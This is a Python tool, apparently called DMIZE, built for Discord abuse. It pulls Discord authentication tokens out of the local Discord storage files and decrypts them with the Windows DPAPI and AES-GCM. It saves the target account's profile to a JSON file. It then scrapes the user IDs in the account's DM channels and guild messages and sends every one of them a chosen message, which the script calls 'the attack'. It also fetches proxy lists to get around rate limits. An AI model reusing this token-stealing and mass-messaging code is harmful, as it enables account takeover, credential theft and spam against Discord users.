import os, re, json, requests,datetime, colorama, base64, subprocess, importlib,urllib.request, urllib.error;from colorama import *;from urllib.request import Request, urlopen;from Crypto.Cipher import AES;from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer;from json import dumps, loads as json_loads, load;header,requests_url,modules, missing_modules,proxy_list,id_list, guild_list,guild_scrap,channel_scrap,user_scrap,message_sent=modules = { 'Cookie': '__dcfduid=30b25b30bdb811eca9acdd9d360ada08','Content-Type': 'application/json','x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImZyLUZSIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwNy4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTA3LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiJodHRwczovL2Rpc2NvcmQuY29tLyIsInJlZmVycmluZ19kb21haW4iOiJkaXNjb3JkLmNvbSIsInJlZmVycmVyX2N1cnJlbnQiOiJodHRwczovL2Rpc2NvcmQuY29tLyIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6ImRpc2NvcmQuY29tIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTYwNjQ1LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=='},{'proxies' : 'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt','ip' : "http://ipinfo.io/json",'user' : 'https://discord.com/api/v6/users/@me','private_channel' : "https://discord.com/api/v9/users/@me/channels",'guild' : "https://discord.com/api/v9/users/@me/guilds",'guild_channel' : 'https://discord.com/api/v8/guilds/{guild_id}/channels','channel_content' : 'https://discord.com/api/v8/channels/{channel_id}/messages','message' : 'https://discord.com/api/v9/channels/{id}/messages','up_channel' : 'https://discord.com/api/v8/users/@me/channels'},['urllib.request','Crypto.Cipher','ctypes','json','colorama'],[],[],[],[],0,0,0,0
def gather_modules():
    #in maintenance
    def install_module(module):subprocess.run(['pip', 'install', module], stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
    def installing_module_prompt(module):print(f'{Fore.LIGHTBLACK_EX}{used()} {Fore.YELLOW}DOWNLOADING   {Fore.MAGENTA} installing.modules {Fore.WHITE} downloading module {module}.',install_module())
    def modules_install_prompt():print(f'{Fore.LIGHTBLACK_EX}{used()} {Fore.YELLOW}WARNING   {Fore.MAGENTA} missing.modules {Fore.WHITE} No modules to download on the system.')
    def installed_modules():
        for module_name in modules:
            try:importlib.import_module(module_name)
            except ImportError:missing_modules.append(module_name)
        if len(missing_modules) != 0:
            for module in missing_modules:installing_module_prompt(module)
        else:modules_install_prompt()
    installed_modules()
def gather_proxy():
    for proxy in requests.get(requests_url['proxies']).text.splitlines():proxy_list.append(proxy);return len(proxy_list)
def getheaders(token):
    headers = {"Content-Type": "application/json",'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0'}
    if token: headers.update({"Authorization": token});return headers
def gather_token():
    def DecryptValue(buff, master_key=None):return (AES.new(master_key, AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode() if buff[:3].decode('utf8', 'ignore') in {'v10', 'v11'} else None)
    class DATA_BLOB(Structure):_fields_ = [('cbData', wintypes.DWORD),('pbData', POINTER(c_char))]
    def GetData(blob_out):buffer = c_buffer(int(blob_out.cbData)); cdll.msvcrt.memcpy(buffer, blob_out.pbData, int(blob_out.cbData)); windll.kernel32.LocalFree(blob_out.pbData); return buffer.raw
    def CryptUnprotectData(encrypted_bytes, entropy=b''):blob_out = DATA_BLOB();return GetData(blob_out) if windll.crypt32.CryptUnprotectData(byref(DATA_BLOB(len(encrypted_bytes), c_buffer(encrypted_bytes, len(encrypted_bytes)))), None, byref(DATA_BLOB(len(entropy), c_buffer(entropy, len(entropy)))), None, None, 0x01, byref(blob_out)) else None
    def get_tokens(tokens= [],found_tokens =[]):
        def search(path: str) -> list:return [token for file_name in os.listdir(path + "\\Local Storage\\leveldb") if file_name.endswith((".log", ".ldb")) for line in [x.strip() for x in open(f"{path}\\Local Storage\\leveldb\\{file_name}", errors="ignore").read().splitlines()] for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{38}", r"mfa\.[\w-]{84}") for token in re.findall(regex, line)]
        def encrypt_search(path):
            if not os.path.exists(f"{path}/Local State"): return []
            with open(path + "/Local State", 'r', encoding='utf-8') as f: local_state = json.loads(f.read())
            for file in os.listdir(path + "\\Local Storage\\leveldb"):
                if file.endswith(".log") or file.endswith(".ldb")   :
                    for line in [x.strip() for x in open(f"{path}\\Local Storage\\leveldb\\{file}", errors="ignore").readlines() if x.strip()]:
                        for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                            try: urllib.request.urlopen(urllib.request.Request("https://discord.com/api/v9/users/@me",headers={'content-type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11','authorization': DecryptValue(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), CryptUnprotectData(base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]))}))
                            except urllib.error.HTTPError as e:continue
                            if DecryptValue(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), CryptUnprotectData(base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:])) not in found_tokens and DecryptValue(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), CryptUnprotectData(base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:])) not in tokens:found_tokens.append(DecryptValue(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), CryptUnprotectData(base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:])))
            return found_tokens
        return [token for token in search(os.getenv("APPDATA") + "\\Discord") + encrypt_search(os.getenv("APPDATA") + "\\Discord")][0]
    return get_tokens(tokens= [],found_tokens =[])

def gather_ip():return requests.get(requests_url['ip']).json()['ip']
def gather_user():return os.getenv('USERNAME')
def used():return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
def gather_discord_username(token):return requests.get(requests_url['user'], headers=getheaders(token)).json()['username']
def gather_discord_phone(token):return requests.get(requests_url['user'], headers=getheaders(token)).json()['phone']
def set_console_title(title):os.system(f'title "{title}"')
def input_prompt():return f'{Fore.GREEN}[{Fore.GREEN}{Fore.WHITE}?{Fore.WHITE}{Fore.GREEN}]{Fore.GREEN}'
def print_prompt():return f'{Fore.GREEN}[{Fore.GREEN}{Fore.WHITE}!{Fore.WHITE}{Fore.GREEN}]{Fore.GREEN}'
def is_path_exist(token):
    for path in os.listdir(absolute_path()):
        if path == f'{gather_discord_username(token=token)}.json': os.remove(path)
def absolute_path():return os.path.dirname(os.path.abspath(__file__))
def get_user_info(token):return requests.get(requests_url['user'], headers=getheaders(token)).json()
def write_info(token):
    is_path_exist(token=token)
    with open(f'{gather_discord_username(token=token)}.json', 'w') as file:json.dump(get_user_info(token=token), file, indent=4)
def check_token(token):
    if requests.get(requests_url['user'], headers=getheaders(token)).status_code == 200:pass
    else:print(f'{Fore.LIGHTBLACK_EX}{used()} {print_prompt()}{Fore.RED} Wrong token !');input();exit()
def Mass_Dm():  
    def gather_private_channel():return requests.get(requests_url['up_channel'], headers=getheaders(token)).json()
    def append_private():
        for conv in gather_private_channel():id_list.append(f'{int(conv["id"])}')
    def gather_user_guilds():return requests.get(requests_url['guild'], headers=getheaders(token)).json()
    def gather_guilds_channel(id_guild):return requests.get(requests_url['guild_channel'].format(guild_id=id_guild), headers=getheaders(token)).json()
    def gather_activ_user_id(id_channel):return requests.get(requests_url['channel_content'].format(channel_id=id_channel), headers=getheaders(token)).json()
    def return_header(token):header.update({"Authorization": token});return header
    def gather_id_guild_list():
        for chanel in gather_user_guilds():   
            for elr in gather_guilds_channel(id_guild=chanel['id']):
                for message in gather_activ_user_id(id_channel=elr['id']):          
                    try :
                        if message['author']['id'] not in id_list: id_list.append(f"{message['author']['id']}")
                    except:pass   
    def gather_id_list():append_private();gather_id_guild_list();return id_list
        
    def gather_new_thread(iid):return requests.post(requests_url['private_channel'], headers=return_header(token), json={'recipients': [iid]}).json()["id"]  
    def send_thread(iid):return requests.post(requests_url['message'].format(id=gather_new_thread(iid)),data={"content": f'{content}'},headers={'Authorization': token}).status_code
    def DMIZE():
        for iid in gather_id_list(): 
            try:
                if send_thread(iid) == 200: print('send')
            except: pass
    DMIZE()

if __name__ == "__main__":global token , content;set_console_title(f'DMIZE - Mass DM | connect as {gather_discord_username(token=gather_token())} : {gather_discord_phone(token=gather_token())}');print(f'{Fore.LIGHTBLACK_EX}{used()} {Fore.YELLOW}WARNING   {Fore.MAGENTA} acces.point.gateway {Fore.WHITE} Proxies could be add if the hoster IP get rate limit {gather_ip()}.');print(f'{Fore.LIGHTBLACK_EX}{used()} {Fore.BLUE}INFO      {Fore.MAGENTA} autorization.user {Fore.WHITE} logging in using static token {gather_token()}.');print(f'{Fore.LIGHTBLACK_EX}{used()} {Fore.BLUE}INFO      {Fore.MAGENTA} login.user {Fore.WHITE} Session connect on {gather_user()}');print(f'{Fore.LIGHTBLACK_EX}{used()} {Fore.RED}SCRAPING  {Fore.MAGENTA} update.gateway {Fore.WHITE} Scraping proxies to avoid rate limit risk -> Proxies scrap =  {gather_proxy()}');token = input(f'{Fore.LIGHTBLACK_EX}{used()} {input_prompt()}{Fore.WHITE} Enter Token to MassDm :');check_token(token=token);print(f'{Fore.LIGHTBLACK_EX}{used()} {print_prompt()}{Fore.WHITE} Sucessfully log into {gather_discord_username(token=token)}');write_info(token=token);print(f'{Fore.LIGHTBLACK_EX}{used()} {print_prompt()}{Fore.WHITE} Target account info upload to {Fore.RED}{gather_discord_username(token=token)}.json{Fore.RED}');content = input(f'{Fore.LIGHTBLACK_EX}{used()} {input_prompt()}{Fore.WHITE} Enter the message to sent trough {Fore.RED}{gather_discord_username(token=token)}{Fore.RED}{Fore.WHITE} account :');input(f'{Fore.LIGHTBLACK_EX}{used()} {print_prompt()}{Fore.WHITE} Enter to start the attack ...');Mass_Dm();print(f'{Fore.LIGHTBLACK_EX}{used()} {print_prompt()}{Fore.WHITE} Attack finish');print(f'{Fore.LIGHTBLACK_EX}{used()} {print_prompt()}{Fore.WHITE} Final Stats -> {Fore.GREEN}guild scrap{Fore.WHITE} : {Fore.LIGHTRED_EX}{guild_scrap}{Fore.WHITE} | {Fore.GREEN}channel scrap{Fore.WHITE} : {Fore.LIGHTRED_EX}{channel_scrap}{Fore.WHITE} | {Fore.GREEN}user scrap{Fore.WHITE} : {Fore.LIGHTRED_EX}{user_scrap}{Fore.WHITE} | {Fore.GREEN}message sent {Fore.WHITE} : {Fore.LIGHTRED_EX}{message_sent}{Fore.WHITE}');print(f'{Fore.LIGHTBLACK_EX}{used()} {print_prompt()}{Fore.WHITE} Thanks for using DMIZE');input()

